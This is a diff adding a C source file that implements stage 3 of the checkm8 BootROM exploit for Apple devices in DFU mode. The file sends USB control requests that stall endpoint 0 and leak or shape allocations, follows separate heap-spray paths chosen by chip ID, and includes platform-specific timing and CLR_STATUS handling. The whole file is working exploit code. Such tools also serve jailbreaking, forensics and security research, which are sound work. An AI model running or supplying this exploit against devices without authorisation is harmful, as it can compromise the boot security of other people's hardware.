@@ -1,0 +1,366 @@
+/* checkm8_spray.c -- checkm8 spray helpers + stage 3 */
+
+/* Max attempts for the stall loop and each spin loop in the spray stage. */
+#define MAX_STALL_RETRIES 100
+
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+
+#include "dfu/dfu_handler.h"
+#include "dfu/checkm8.h"
+#include "dfu/checkm8_internal.h"
+#include "dfu/dfu_proto.h"
+#include "device/chip_db.h"
+#include "util/usb_helpers.h"
+#include "util/log.h"
+
+#if defined(__APPLE__)
+#include "dfu/iokit_usb.h"
+#endif
+
+/* ------------------------------------------------------------------ */
+/* checkm8_usb_request_stall                                           */
+/* ------------------------------------------------------------------ */
+
+/*
+ * bmRequestType = 0x02 (host-to-device, standard, endpoint)
+ * bRequest      = 0x03 (SET_FEATURE)
+ * wValue        = 0
+ * wIndex        = 0x80 (EP0 IN)
+ * wLength       = 0
+ *
+ * Provokes a STALL on EP0 because SET_FEATURE(ENDPOINT_HALT)
+ * on the IN endpoint is not valid in DFU mode.
+ */
+int checkm8_usb_request_stall(libusb_device_handle *usb)
+{
+    int ret;
+
+    log_debug("request_stall: SET_FEATURE(ENDPOINT_HALT) bmReqType=0x02 "
+              "bReq=0x03 wIdx=0x80");
+    ret = usb_ctrl_transfer_no_data_raw(usb, 0x02, 0x03, 0, 0x80,
+                                        USB_TIMEOUT_MS);
+
+    if (ret == LIBUSB_ERROR_PIPE) {
+        log_debug("request_stall: STALL received (success)");
+        return 1;
+    }
+    log_debug("request_stall: ret=%d (%s) -- no STALL",
+              ret, ret < 0 ? libusb_strerror(ret) : "ok");
+    return 0;
+}
+
+/* ------------------------------------------------------------------ */
+/* checkm8_usb_request_leak                                            */
+/* ------------------------------------------------------------------ */
+
+/*
+ * GET_DESCRIPTOR for string descriptor (type=3, index=serial)
+ * with wIndex = USB_MAX_STRING_DESC_IDX (10, not a real language ID).
+ * 1ms timeout, expect 0 bytes back (allocation happened but no data
+ * returned before timeout).
+ */
+int checkm8_usb_request_leak(libusb_device_handle *usb, uint8_t iserial_idx)
+{
+    unsigned char *buf;
+    int ret;
+
+    buf = calloc(1, EP0_MAX_PACKET_SZ);
+    if (!buf)
+        return 0;
+
+    log_debug("request_leak: GET_DESCRIPTOR string idx=%u len=%u timeout=%ums",
+              iserial_idx, EP0_MAX_PACKET_SZ, STALL_TIMEOUT_MS);
+    ret = usb_ctrl_transfer_async_ret(usb, 0x80, 0x06,
+                                      (uint16_t)((3U << 8U) | iserial_idx),
+                                      USB_MAX_STRING_DESC_IDX,
+                                      buf, EP0_MAX_PACKET_SZ,
+                                      STALL_TIMEOUT_MS);
+    free(buf);
+
+    log_debug("request_leak: ret=%d -> %s",
+              ret, ret == 0 ? "LEAK OK (0 bytes)" : "no leak");
+    return (ret == 0) ? 1 : 0;
+}
+
+/* ------------------------------------------------------------------ */
+/* checkm8_stall                                                       */
+/* ------------------------------------------------------------------ */
+
+/*
+ * Sends GET_DESCRIPTOR with 3*EP0_MAX_PACKET_SZ length, variable
+ * timeout. Loops until a short transfer occurs and a subsequent
+ * leak request succeeds.
+ */
+int checkm8_stall(libusb_device_handle *usb, uint8_t iserial_idx)
+{
+    unsigned usb_timeout = USB_ABORT_TIMEOUT_DEFAULT;
+    unsigned usb_abort_timeout = usb_timeout - 1;
+    uint16_t desc_len = 3 * EP0_MAX_PACKET_SZ;
+    int attempt = 0;
+
+    log_info("checkm8_stall: starting stall loop (desc_len=%u)", desc_len);
+
+    for (;;) {
+        unsigned char *buf;
+        int ret;
+
+        if (++attempt > MAX_STALL_RETRIES) {
+            log_error("checkm8_stall: exceeded %d retries, giving up",
+                      MAX_STALL_RETRIES);
+            return -1;
+        }
+
+        buf = calloc(1, desc_len);
+        if (!buf)
+            continue;
+
+        log_debug("checkm8_stall: attempt %d, abort_timeout=%u",
+                  attempt, usb_abort_timeout);
+        ret = usb_ctrl_transfer_async_ret(usb, 0x80, 0x06,
+                                          (uint16_t)((3U << 8U) | iserial_idx),
+                                          USB_MAX_STRING_DESC_IDX,
+                                          buf, desc_len,
+                                          usb_abort_timeout);
+        free(buf);
+
+        log_debug("checkm8_stall: GET_DESCRIPTOR ret=%d (need < %u)", ret, desc_len);
+
+        if (ret >= 0 && (uint16_t)ret < desc_len &&
+            checkm8_usb_request_leak(usb, iserial_idx)) {
+            log_info("checkm8_stall: stall succeeded on attempt %d "
+                     "(short_xfer=%d, leak confirmed)", attempt, ret);
+            break;
+        }
+
+        /* Rotate abort timeout */
+        usb_abort_timeout = (usb_abort_timeout + 1)
+                            % (usb_timeout - USB_ABORT_TIMEOUT_MIN + 1)
+                            + USB_ABORT_TIMEOUT_MIN;
+    }
+
+    return 0;
+}
+
+/* ------------------------------------------------------------------ */
+/* checkm8_no_leak                                                     */
+/* ------------------------------------------------------------------ */
+
+/*
+ * Same as leak but with length = 3*EP0_MAX_PACKET_SZ + 1 (0xC1).
+ * The extra byte forces a different allocation size.
+ */
+int checkm8_no_leak(libusb_device_handle *usb, uint8_t iserial_idx)
+{
+    uint16_t desc_len = 3 * EP0_MAX_PACKET_SZ + 1;
+    unsigned char *buf;
+    int ret;
+
+    buf = calloc(1, desc_len);
+    if (!buf)
+        return 0;
+
+    log_debug("no_leak: GET_DESCRIPTOR len=%u (odd size for hole creation)",
+              desc_len);
+    ret = usb_ctrl_transfer_async_ret(usb, 0x80, 0x06,
+                                      (uint16_t)((3U << 8U) | iserial_idx),
+                                      USB_MAX_STRING_DESC_IDX,
+                                      buf, desc_len,
+                                      STALL_TIMEOUT_MS);
+    free(buf);
+
+    log_debug("no_leak: ret=%d -> %s",
+              ret, ret == 0 ? "NO_LEAK OK (0 bytes)" : "failed");
+    return (ret == 0) ? 1 : 0;
+}
+
+/* ------------------------------------------------------------------ */
+/* Stage 3: Heap spray                                                 */
+/* ------------------------------------------------------------------ */
+
+int checkm8_stage_spray(dfu_ctx_t *ctx)
+{
+    libusb_device_handle *usb;
+    const chip_info_t *chip;
+    uint8_t iserial_idx;
+    size_t i;
+
+    if (!ctx || !ctx->dev || !ctx->chip)
+        return -1;
+
+    usb = ctx->dev->usb;
+    chip = ctx->chip;
+    /*
+     * Descriptor index for the CPID/ECID serial string.  Populated by
+     * usb_dfu_find() from bDeviceDescriptor.iSerialNumber.  If the
+     * device never reported one, fall back to 3 -- every checkm8-
+     * compatible chip (A5..A11) ships with iSerial=3, so the
+     * historical constant remains a safe default here.
+     */
+    iserial_idx = ctx->dev->iserial_index ? ctx->dev->iserial_index : 3;
+    log_info("checkm8: stage 3/4 -- heap spray (iSerial idx %u)",
+             (unsigned)iserial_idx);
+
+    if (chip->config_large_leak == 0) {
+        uint32_t cpid = chip->cpid;
+
+        /*
+         * No-leak path. Two sub-paths based on CPID:
+         *
+         * Path A (0x8000/0x8003/0x7000/0x7001/0x7002):
+         *   Retry stall+leak+no_leak in a single loop.
+         *
+         * Path B (all others with config_hole):
+         *   Stall, then create config_hole holes via no_leak,
+         *   then final leak+no_leak.
+         */
+        if (cpid == 0x7001 || cpid == 0x7000 || cpid == 0x7002 ||
+            cpid == 0x8003 || cpid == 0x8000) {
+            int spray_attempt = 0;
+            log_debug("checkm8_stage_spray: path A (CPID 0x%04X)", cpid);
+            while (!checkm8_usb_request_stall(usb) ||
+                   !checkm8_usb_request_leak(usb, iserial_idx) ||
+                   !checkm8_no_leak(usb, iserial_idx)) {
+                if (++spray_attempt > MAX_STALL_RETRIES) {
+                    log_error("checkm8_stage_spray: path A exceeded %d retries",
+                              MAX_STALL_RETRIES);
+                    return -1;
+                }
+                if (spray_attempt % 10 == 0)
+                    log_debug("checkm8_stage_spray: path A attempt %d/%d",
+                              spray_attempt, MAX_STALL_RETRIES);
+            }
+            log_info("checkm8_stage_spray: path A stall+leak+no_leak OK "
+                     "(attempt %d)", spray_attempt + 1);
+        } else {
+            log_debug("checkm8_stage_spray: path B (config_hole=%u)", chip->config_hole);
+            if (checkm8_stall(usb, iserial_idx) != 0)
+                return -1;
+            log_debug("checkm8_stage_spray: stall succeeded, creating %u holes", chip->config_hole);
+            for (i = 0; i < chip->config_hole; ++i) {
+                int hole_attempt = 0;
+                while (!checkm8_no_leak(usb, iserial_idx)) {
+                    if (++hole_attempt > MAX_STALL_RETRIES) {
+                        log_error("checkm8_stage_spray: no_leak hole %zu "
+                                  "exceeded %d retries",
+                                  i, MAX_STALL_RETRIES);
+                        return -1;
+                    }
+                }
+                log_debug("checkm8_stage_spray: hole %zu/%u created "
+                          "(%d attempts)", i + 1, chip->config_hole,
+                          hole_attempt + 1);
+            }
+            int final_attempt = 0;
+            log_debug("checkm8_stage_spray: path B final leak+no_leak");
+            while (!checkm8_usb_request_leak(usb, iserial_idx) ||
+                   !checkm8_no_leak(usb, iserial_idx)) {
+                if (++final_attempt > MAX_STALL_RETRIES) {
+                    log_error("checkm8_stage_spray: path B final loop "
+                              "exceeded %d retries", MAX_STALL_RETRIES);
+                    return -1;
+                }
+            }
+            log_info("checkm8_stage_spray: path B done (%u holes, "
+                     "final in %d attempts)",
+                     chip->config_hole, final_attempt + 1);
+        }
+
+        /* Final: DFU_CLR_STATUS to transition dfuERROR → dfuIDLE.
+         * Skip if stage 2 already got DFU to dfuIDLE via DFU_ABORT
+         * (usbipd path): CLR_STATUS from dfuIDLE causes Apple DFU to
+         * exit DFU mode, which would break the process. */
+        if (!ctx->skip_clrstatus) {
+#if defined(__APPLE__)
+            if (iokit_usb_is_active()) {
+                /* IOKit path: zero-length CLR_STATUS only.
+                 *
+                 * The oversized (193-byte) variant sends wLength=193
+                 * but the BootROM's CLRSTATUS handler expects wLength=0.
+                 * On Apple Silicon XHCI, DeviceRequestTO hangs on the
+                 * unacknowledged DATA phase → kIOReturnNotResponding
+                 * (0xe00002ed), which permanently poisons the IOKit
+                 * handle for all subsequent transfers.
+                 *
+                 * The heap grooming from the extra allocation is not
+                 * critical for path A — stall+leak+no_leak already
+                 * shaped the heap.  State transition is all we need. */
+                int clr_ret = usb_ctrl_transfer_no_data_raw(usb, 0x21,
+                                      DFU_REQ_CLRSTATUS,
+                                      0, 0, USB_TIMEOUT_MS);
+                log_debug("checkm8_stage_spray: CLR_STATUS (zero-len, IOKit) "
+                          "ret=%d (%s)", clr_ret,
+                          clr_ret < 0 ? libusb_strerror(clr_ret) : "ok");
+            } else
+#endif
+            {
+                uint16_t clr_len = 3 * EP0_MAX_PACKET_SZ + 1;
+                uint8_t *clr_buf = calloc(1, clr_len);
+                log_debug("checkm8_stage_spray: sending DFU_CLR_STATUS "
+                          "with %u bytes", clr_len);
+                if (clr_buf) {
+                    int clr_ret = usb_ctrl_transfer_raw(usb, 0x21,
+                                          DFU_REQ_CLRSTATUS,
+                                          0, 0, clr_buf, clr_len,
+                                          USB_TIMEOUT_MS);
+                    log_debug("checkm8_stage_spray: CLR_STATUS ret=%d (%s)",
+                              clr_ret,
+                              clr_ret < 0 ? libusb_strerror(clr_ret) : "ok");
+                    free(clr_buf);
+                }
+            }
+        } else {
+            log_info("[DFU] stage 3: skip CLR_STATUS (DFU already in dfuIDLE)");
+        }
+    } else {
+        /*
+         * Large-leak path: config_large_leak stall requests,
+         * then DFU_CLR_STATUS with 0 data bytes.
+         */
+        log_debug("checkm8_stage_spray: large-leak path (%zu stalls)", chip->config_large_leak);
+        for (i = 0; i < chip->config_large_leak; ++i) {
+            int large_attempt = 0;
+            while (!checkm8_usb_request_stall(usb)) {
+                if (++large_attempt > MAX_STALL_RETRIES) {
+                    log_error("checkm8_stage_spray: large_leak stall %zu "
+                              "exceeded %d retries",
+                              i, MAX_STALL_RETRIES);
+                    return -1;
+                }
+            }
+            if ((i + 1) % 10 == 0 || i + 1 == chip->config_large_leak)
+                log_debug("checkm8_stage_spray: large_leak stall %zu/%zu done",
+                          i + 1, chip->config_large_leak);
+        }
+        log_debug("checkm8_stage_spray: large-leak stalls done, CLR_STATUS");
+        dfu_clr_status(usb);
+    }
+
+    /*
+     * On usbipd-win, GET_DESCRIPTOR spray requests are sent with
+     * very short timeouts (1ms).  The device allocates response
+     * buffers that are only freed after its own internal USB timeout
+     * fires (~50-200ms per buffer).  If stage 4 starts immediately,
+     * those buffers still occupy the heap and the DFU_DNLOAD
+     * io_buffer cannot land at insecure_memory_base.
+     *
+     * Wait 1 second on non-Apple hosts to ensure all spray buffers
+     * are freed by the device before stage 4's DFU_DNLOAD allocation.
+     *
+     * On macOS native USB the buffers are freed as transfers complete,
+     * and a 1-second pause gives AMDRadioUI/AMPDevicesAgent time to
+     * reclaim the IOService, causing stage 4 to get LIBUSB_ERROR_NO_DEVICE.
+     */
+#if !defined(__APPLE__)
+    log_debug("checkm8_stage_spray: waiting 1s for usbipd spray buffer drain");
+    usleep(1000000);
+#else
+    log_debug("checkm8_stage_spray: waiting 50ms for BootROM state to settle");
+    usleep(50000);
+#endif
+
+    ctx->phase = DFU_PHASE_SPRAY;
+    log_info("checkm8: stage 3 complete -- heap spray done");
+    return 0;
+}
